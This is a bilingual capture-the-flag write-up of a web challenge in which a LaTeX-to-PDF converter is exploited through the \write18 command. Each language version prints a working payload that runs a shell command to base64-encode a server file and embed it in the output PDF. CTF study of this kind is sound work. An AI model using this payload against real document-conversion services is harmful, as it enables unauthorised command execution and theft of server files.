## TexMaker (Web, 90p)

	Description: Creating and using coperate templates is sometimes really hard. Luckily, 
	we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed
	the whole code and did not find any flaws.

###ENG
[PL](#pl-version)

In this task we could upload latex file, which server would convert to PDF, and allow us to 
see it. As it turns out, there is a latex command, which allows us to use any system command.
Hence, we could simply print out flag (base64-encoded, since latex doesn't like special
characters):
```
\immediate\write18{cat ../flag.php | base64 > script.tex 2>&1}
\openin5=script.tex
\def\readfile{%
\read5 to\curline
\ifeof5 \let\next=\relax
\else \curline˜\\
\let\next=\readfile
\fi
\next}%
\ifeof5 Couldn't read the file!%
\else \readfile \closein5
\fi
```

###PL version

W tym zadaniu mogliśmy wysłać plik w latexu, który strona konwertowała do pdf-a, a następnie 
dawała do niego linka. Jak się okazuje, istnieje komenda latexa do wykonania dowolnego polecenia
systemowego. Korzystając z tego, wypisujemy flagę (zakodowaną base64, żeby nie zepsuć parsera):
```
\immediate\write18{cat ../flag.php | base64 > script.tex 2>&1}
\openin5=script.tex
\def\readfile{%
\read5 to\curline
\ifeof5 \let\next=\relax
\else \curline˜\\
\let\next=\readfile
\fi
\next}%
\ifeof5 Couldn't read the file!%
\else \readfile \closein5
\fi
```
